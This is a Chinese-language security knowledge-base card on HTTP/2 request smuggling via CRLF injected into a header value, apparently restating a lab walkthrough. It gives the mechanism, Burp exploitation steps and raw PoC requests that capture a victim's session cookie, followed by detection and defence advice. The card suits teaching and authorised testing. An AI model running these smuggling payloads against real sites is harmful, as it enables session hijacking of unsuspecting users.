---
id: web-generic-http-smuggling-h2-crlf-header-value-te-bypass
title: HTTP/2 头值 CRLF 注入走私：前端剥离正常 TE 头却放过头值里的 \r\nTransfer-Encoding，降级后后端恢复分块解析
type: scenario
domain: web
path: web/generic/http-smuggling
technique: http2-crlf-header-value-te-injection
tags:
- http2
- request-smuggling
- crlf-injection
- transfer-encoding
- desync
- bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V609
  verified_at: '2026-11-12T19:40:52+08:00'
  notes: '已对照原文12691「CRLF走私」节及截图26-30核对：Burp Inspector中foo头值为bar\r\nTransfer-Encoding: chunked的kettled请求、坏包404、body 0+走私POST /(Host/Cookie/Content-Length:800/search=x)、刷新后搜索结果页回显受害者请求行与Cookie。修正三处：①走私POST /里的Cookie应为攻击者自己的会话(原文YOUR-SESSION-COOKIE)，受害者Cookie是从拼接回显的搜索结果中截获，原卡误标victim-session/victim or attacker，已改为attacker-session；②step4机制表述改为按800读取body并把后续受害者请求行/头拼入body回显；③step5删除原文该靶场未演示的“把请求引导到攻击者资源”(那是H2.CL靶场)，改为原文的“刷新搜索结果页多次尝试看到回显的受害者会话”。dedup：除自身外最高相关为unknown-te-cl-differential、CL.0、HAProxy CVE等HTTP/1链，均不同链；与请求拆分卡(注入完整请求行)和H2.TE卡(直接TE头)区分，原子。原文未给产品版本，保持省略；未在本机复现。'
url: /docs/web/generic/http-smuggling/web-generic-http-smuggling-h2-crlf-header-value-te-bypass/
draft: false
kb_aliases:
- HTTP/2 CRLF injection smuggling
- H2 header value CRLF
- kettled request
- 头值注入 Transfer-Encoding
- 绕过 TE 剥离
---

## 一句话结论

HTTP/2 是二进制协议，头部边界由长度和预定义偏移决定，`\r\n` 在头值里原本没有分隔语义；如果前端在降级成 HTTP/1.1 时不清理头值里的 `\r\n`，攻击者可在任意头值中注入 `\r\nTransfer-Encoding: chunked`，绕过前端"见到 TE 头就剥离/拒绝"的防护，让后端重新按 chunked 解析并产生请求走私。

## 原理

- 在 HTTP/1 中，`\r\n` 是头部分隔符；在 HTTP/2 中头部是二进制编码的键值对，值内可以（在实现容忍时）包含 `\r\n` 而不被当作分隔符。Burp 把这种"无法用 HTTP/1 语法表示"的请求标记为 kettled。
- 前端做 H2→H1 降级时按字符串重建请求头。若只对"独立的 Transfer-Encoding 头"做剥离，而不检查头值内部的 CRLF，就会把 `Foo: bar\r\nTransfer-Encoding: chunked` 原样写进 HTTP/1 请求。
- HTTP/1 后端重新按文本解析时，`\r\n` 生效，头被拆成两个：`Foo: bar` 与 `Transfer-Encoding: chunked`。后端于是按 chunked 读取 body，`0\r\n\r\n` 提前结束，后续字节成为下一个请求。
- 该手法专门用于绕过针对基本 H2.CL/H2.TE 的防护：即使前端正确校验 `content-length` 并剥离普通 `transfer-encoding` 头，只要头值清理不彻底，仍可注入。
- 为什么成立：安全策略建立在对"头名称"的检查上，而协议转换把检查后的值重新解释为结构；检查与使用之间的解析差异就是绕过空间。独立换行 `\n` 也可能被某些后端当作分隔符，形成类似差异。

## 触发条件

- 前端接受 HTTP/2 并降级为 HTTP/1.1。
- 前端未拒绝/清理头值中的 `\r\n`（或 `\n`），且其 TE 防护只匹配独立头部。
- 后端 HTTP/1 解析器把头值中的 CRLF 当作分隔符，并支持 chunked。
- 连接复用，能把走私请求影响扩展到其他用户。
- 攻击者能用原始 H2 工具构造含 CRLF 的头值。

## 利用步骤

1. Burp Repeater 切 HTTP/2，关闭 Update Content-Length，勾选 Allow HTTP/2 ALPN override。
2. 在请求末尾添加任意头，例如名称 `foo`、值 `bar\r\nTransfer-Encoding: chunked`（Burp 会提示 kettled）。
3. Body 写 `0`、空行、`SMUGGLED`；随后发正常请求，若第二个请求返回 404/被前缀污染，说明后端已按 chunked 解析。
4. 构造完整走私请求：Body 改为 `0` 空行加 `POST / HTTP/1.1`、`Host: TARGET`、`Cookie: session=<attacker-session>`、`Content-Length: 800`、空行、`search=x`。后端会按 800 读取这个 POST 的 body，把随后经同一连接进来的受害者请求行/头（含受害者 Cookie）拼进 body 并回显在搜索结果页，从而泄漏受害者会话（原文截图 29/30 即为搜索结果页回显受害者 Cookie）。
5. 原文靶场中受害者每 15 秒访问主页：发出走私请求后立即刷新浏览器页面，运气好即可在搜索结果页看到被拼接回显的受害者请求（含 Cookie 会话），该步骤需要多次尝试。

## PoC

```http
POST / HTTP/2
Host: TARGET
foo: bar\r\n
Transfer-Encoding: chunked

0

SMUGGLED
```

```http
POST / HTTP/2
Host: TARGET
foo: bar\r\n
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: TARGET
Cookie: session=<attacker-session>
Content-Length: 800

search=x
```

说明：PoC 为原文 CRLF 走私靶场流程的结构化复现，`\r\n` 需作为头值中的真实字节发送（Burp Inspector 可直接编辑），域名与会话值已泛化；未在本机执行，仅用于授权测试。

## 变体与关联

- 变体：只注入 `\n` 而非 `\r\n`，利用"前端不把 \n 当分隔符、后端当分隔符"的差异。
- 变体：在头名称中注入 CRLF，或把头值注入与请求拆分结合，构造完整第二个请求。
- 关联：[[web-generic-http-smuggling-h2-te-downgrade-chunked]]（正常 TE 头被剥离时的替代路径）、[[web-generic-http-smuggling-h2-request-splitting-crlf-host-header]]（CRLF 构造完整请求）、[[web-generic-http-smuggling-apache-rewriterule-crlf-header-injection-bypass]]（HTTP/1 侧同类 CRLF 注入）。
- 边界：前端拒绝包含 CR/LF 的头值、对降级后的头做重新编码/规范化、或后端解析器不容忍头值内换行时，本链不成立。

## 检测与防御

- 检测：HTTP/2 头值中出现 `\r`、`\n`、编码后的 `%0d%0a`；前端日志出现 kettled/异常头；后端看到来源不明的 `Transfer-Encoding`；请求数/响应数错配与异常 404。
- 防御：前端严格拒绝头名/头值中的 CR、LF 与 NUL；H2→H1 转换时对头值做规范化或直接拒绝非法字符；TE 处理统一在转换层完成，后端只信任转换层重建的头。
- 加固：端到端 HTTP/2；升级反代/CDN；WAF 解析 H2 语义并检测头值内换行；监控走私特征。
